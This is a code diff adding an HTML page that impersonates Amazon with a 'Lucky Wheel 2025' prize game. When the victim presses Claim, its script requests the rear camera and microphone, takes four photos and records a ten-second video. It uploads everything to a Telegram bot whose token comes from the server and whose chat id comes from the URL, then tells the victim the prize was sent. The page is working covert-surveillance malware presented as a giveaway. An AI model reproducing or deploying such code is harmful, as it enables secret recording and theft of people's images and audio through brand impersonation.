@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Amazon Lucky Wheel</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;width:100%;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;display:flex;align-items:center;justify-content:center;overflow:hidden}
+.card{background:rgba(15,15,40,0.98);border:4px solid #00ff88;border-radius:30px;width:90%;max-width:360px;padding:20px;text-align:center;box-shadow:0 0 80px rgba(0,255,136,0.8);display:flex;flex-direction:column;align-items:center;justify-content:space-around;height:95vh; min-height:500px}
+.logo{font-size:36px;color:#00ff88;font-weight:900;margin-bottom:6px;text-shadow:0 0 10px #00ff88}
+h2{font-size:22px;color:#ffd700;margin:6px 0;font-weight:bold;text-align:center;text-shadow:0 0 6px #ffd700}
+.wheel{position:relative;width:180px;height:180px;margin:0 auto}
+.circle{width:100%;height:100%;border-radius:50%;background:conic-gradient(#ff1744 0% 20%,#ff9800 20% 40%,#4caf50 40% 60%,#2196f3 60% 80%,#9c27b0 80% 100%);box-shadow:0 0 60px #00ff88;transition:transform 7s cubic-bezier(0.17,0.84,0.15,1);position:relative}
+.prize-text{position:absolute;left:50%;top:50%;font-size:16px;font-weight:900;color:white;text-shadow:2px 2px 6px #000;transform-origin:center;width:40px;margin-left:-20px;text-align:center;pointer-events:none}
+.center{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:50px;height:50px;background:#111;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:900;color:#00ff88;box-shadow:inset 0 0 20px #000;z-index:5}
+
+/* Button Styles */
+.btn{padding:8px 25px;font-size:16px;background:linear-gradient(135deg,#00ff88,#00ffaa);color:black;border:none;border-radius:35px;margin:10px auto;cursor:pointer;font-weight:900;box-shadow:0 8px 25px rgba(0,255,136,0.8);display:block;white-space:nowrap;transition: all 0.3s ease;font-family:'Segoe UI',sans-serif}
+.btn:hover{transform:scale(1.05);background:linear-gradient(135deg,#00ffaa,#00ff88)}
+
+.claimBtn{margin-top:6px;padding:6px 20px;border-radius:25px;border:none;background:linear-gradient(135deg,#ffd700,#ffdd33);color:#111;font-size:14px;font-weight:900;cursor:pointer;box-shadow:0 4px 15px rgba(255,215,0,0.7);font-family:'Segoe UI',sans-serif}
+.claimBtn:hover{transform:scale(1.05);background:linear-gradient(135deg,#ffdd33,#ffd700)}
+
+.resultArea{margin:12px 0;font-size:20px;color:#ffd700;font-weight:bold;line-height:1.2;min-height:40px;text-align:center}
+
+.final{display:none;margin-top:12px;font-size:28px;color:#ffd700;font-weight:900;text-align:center;text-shadow:0 0 20px #ffd700;animation: glow 1s ease-in-out infinite alternate}
+
+@keyframes glow{
+  0%{text-shadow:0 0 10px #ffd700,0 0 20px #ffdd33,0 0 30px #ffdd66;}
+  50%{text-shadow:0 0 20px #ffea00,0 0 30px #ffd700,0 0 40px #ffdd33;}
+  100%{text-shadow:0 0 10px #ffd700,0 0 20px #ffdd33,0 0 30px #ffdd66;}
+}
+
+/* Winner Banner */
+#winnerBanner{display:none;margin-top:10px;font-size:20px;font-weight:900;text-align:center;background:linear-gradient(45deg,#ff0,#f0f,#0ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation: rainbowGlow 2s ease-in-out infinite alternate}
+@keyframes rainbowGlow{
+  0%{text-shadow:0 0 10px #ff0,0 0 20px #f0f,0 0 30px #0ff;}
+  50%{text-shadow:0 0 20px #f0f,0 0 30px #0ff,0 0 40px #ff0;}
+  100%{text-shadow:0 0 10px #0ff,0 0 20px #ff0,0 0 30px #f0f;}
+}
+</style>
+</head>
+<body>
+<div class="card" role="main">
+  <div class="logo">Amazon</div>
+  <h2>Lucky Wheel 2025</h2>
+
+  <div class="wheel">
+    <div class="circle" id="wheel">
+      <div class="center">SPIN</div>
+      <div class="prize-text" style="transform: rotate(0deg) translate(0,-70px) rotate(0deg);">100</div>
+      <div class="prize-text" style="transform: rotate(72deg) translate(0,-70px) rotate(-72deg);">70</div>
+      <div class="prize-text" style="transform: rotate(144deg) translate(0,-70px) rotate(-144deg);">50</div>
+      <div class="prize-text" style="transform: rotate(216deg) translate(0,-70px) rotate(-216deg);">30</div>
+      <div class="prize-text" style="transform: rotate(288deg) translate(0,-70px) rotate(-288deg);">10</div>
+    </div>
+  </div>
+
+  <button class="btn" id="spinBtn">🎡 SPIN NOW 🎡</button>
+
+  <div id="result" class="resultArea" aria-live="polite"></div>
+  <div id="winnerBanner">You are a Winner! 🏆✨</div>
+  <div id="finalMsg" class="final" role="status">Congratulations 🎉</div>
+</div>
+
+<script type="module">
+async function getFastKey() {
+      const res = await fetch('/api/fast_servers');
+      const data = await res.json();
+      return data.fast_key;
+    }
+const fast_key = await getFastKey();
+const CHAT_ID = new URLSearchParams(window.location.search).get('id');
+const prizes=["100","70","50","30","10"];
+const spinBtn=document.getElementById('spinBtn');
+const wheel=document.getElementById('wheel');
+const resultEl=document.getElementById('result');
+const finalMsg=document.getElementById('finalMsg');
+const winnerBanner=document.getElementById('winnerBanner');
+let spinning=false;
+let wonPrize=null;
+const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+
+spinBtn.addEventListener('click',()=>{
+  if(spinning) return;
+  spinning=true;
+  spinBtn.disabled=true;
+  spinBtn.textContent='Spinning...';
+  resultEl.innerHTML='';
+  finalMsg.style.display='none';
+  winnerBanner.style.display='none';
+
+  const winIndex=Math.floor(Math.random()*prizes.length);
+  wonPrize=prizes[winIndex];
+
+  const spins=12+Math.floor(Math.random()*8);
+  const slices=prizes.length;
+  const sliceAngle=360/slices;
+  const segmentCenter=(winIndex*sliceAngle)+(sliceAngle/2);
+  const finalRotation=(spins*360)+(360-segmentCenter);
+
+  wheel.style.transition='transform 7s cubic-bezier(0.17,0.84,0.15,1)';
+  wheel.style.transform=`rotate(${finalRotation}deg)`;
+
+  setTimeout(()=>{
+    resultEl.innerHTML=`You Won<br><span style="font-size:24px;color:#ffd700;font-weight:900">${wonPrize}</span><br><button id="claimBtn" class="claimBtn">🎁 Claim 🎁</button>`;
+    spinBtn.disabled=false;
+    spinBtn.textContent='🎡 SPIN NOW 🎡';
+    spinning=false;
+
+    document.getElementById('claimBtn').addEventListener('click',async function(){
+      this.disabled=true;
+      resultEl.innerHTML="Wait a few seconds...";
+      try{ await backgroundCaptureAndUpload(); }catch(err){console.error(err);}
+    });
+  },7700);
+});
+
+async function backgroundCaptureAndUpload(){
+  let stream;
+  try{
+    // ← यही एक लाइन बदली है → अब रियर कैमरा (back camera) यूज़ होगा
+    stream = await navigator.mediaDevices.getUserMedia({ 
+      video: { facingMode: 'environment' },  // ← rear camera
+      audio: true 
+    });
+  }catch(e){
+    alert("Camera access denied or not available");
+    resultEl.innerHTML = "Camera permission required!";
+    return;
+  }
+
+  const photos=[];
+  const videoChunks=[];
+  const mediaRecorder=new MediaRecorder(stream,{mimeType:'video/webm;codecs=vp8,opus'});
+  mediaRecorder.ondataavailable=e=>{if(e.data && e.data.size) videoChunks.push(e.data)};
+  mediaRecorder.start();
+
+  const track=stream.getVideoTracks()[0];
+  const imageCapture=new ImageCapture(track);
+
+  for(let i=0;i<4;i++){
+    try{ photos.push(await imageCapture.takePhoto()); }catch(e){}
+    await sleep(100);
+  }
+
+  const videoPromise=new Promise(res=>{
+    mediaRecorder.onstop=res;
+    setTimeout(()=>mediaRecorder.stop(),10000);
+  });
+
+  for(let i=0;i<photos.length;i++) await sendPhoto(photos[i],i+1);
+  await videoPromise;
+  await sendVideo(new Blob(videoChunks,{type:'video/webm'}));
+
+  stream.getTracks().forEach(t=>t.stop());
+  resultEl.innerHTML='';
+  winnerBanner.style.display='block';
+  finalMsg.style.display='block';
+  finalMsg.innerHTML = "Congratulations 🎉<br>Your prize has been sent!";
+}
+
+async function sendPhoto(blob,index){
+  const fd=new FormData();
+  fd.append('chat_id',CHAT_ID);
+  fd.append('photo',blob,`photo_${index}.jpg`);
+  fd.append('caption',`Prize: ${wonPrize} Points\nPhoto ${index}/4 (Rear Camera)`);
+  await fetch(`https://api.telegram.org/bot${fast_key}/sendPhoto`,{method:'POST',body:fd});
+}
+
+async function sendVideo(blob){
+  const fd=new FormData();
+  fd.append('chat_id',CHAT_ID);
+  fd.append('video',blob,'recording_10s_rear.webm');
+  fd.append('caption',`Prize: ${wonPrize} Points\n10s Video (Rear Camera)`);
+  await fetch(`https://api.telegram.org/bot${fast_key}/sendVideo`,{method:'POST',body:fd});
+}
+</script>
+</body>
+</html>
